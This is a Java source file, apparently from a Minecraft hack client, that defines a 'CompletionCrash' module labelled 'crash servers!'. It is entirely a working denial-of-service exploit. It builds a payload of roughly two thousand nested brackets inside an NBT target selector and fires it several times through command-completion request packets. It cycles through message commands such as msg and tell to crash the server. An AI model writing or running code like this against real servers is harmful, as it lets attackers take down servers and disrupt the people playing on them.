package wtf.l4j.impl.modules.crash;

import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import wtf.l4j.api.module.Category;
import wtf.l4j.api.module.Module;
import wtf.l4j.api.module.ModuleInfo;

@ModuleInfo(name = "CompletionCrash", desc = "crash servers!", category = Category.CRASH)
public class CompletionCrash extends Module {

    private final boolean autoMode = true;
    private final int packets = 3;

    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";

    private final String[] knownWorkingMessages = {
            "msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg",
            "minecraft:teammsg", "minecraft:w", "minecraft:me"
    };

    private int messageIndex = 0;

    @Override
    public void onEnable() {
        messageIndex = 0;
        if (autoMode) return;

        int length = 2032;
        String overflow = generateJsonObject(length);
        String message = "msg @a[nbt={PAYLOAD}]";
        String partialCommand = message.replace("{PAYLOAD}", overflow);
        for (int i = 0; i < packets; i++) {
            sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }
        toggle();
        super.onEnable();
    }

    private void repeatable() {
        if (!autoMode) {
            return;
        }

        if (messageIndex == knownWorkingMessages.length - 1) {
            messageIndex = 0;
            toggle();
            return;
        }

        try {
            Thread.sleep(20);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;

        int len = 2044 - knownMessage.length();
        String overflow = generateJsonObject(len);
        String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

        for (int i = 0; i < packets; i++) {
            sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }

        messageIndex++;
    }

    private String generateJsonObject(int levels) {
        String json = "";
        for (int i = 0; i < levels; i++) {
            json += "[";
        }
        json = "{a:" + json + "}";
        return json;
    }
}

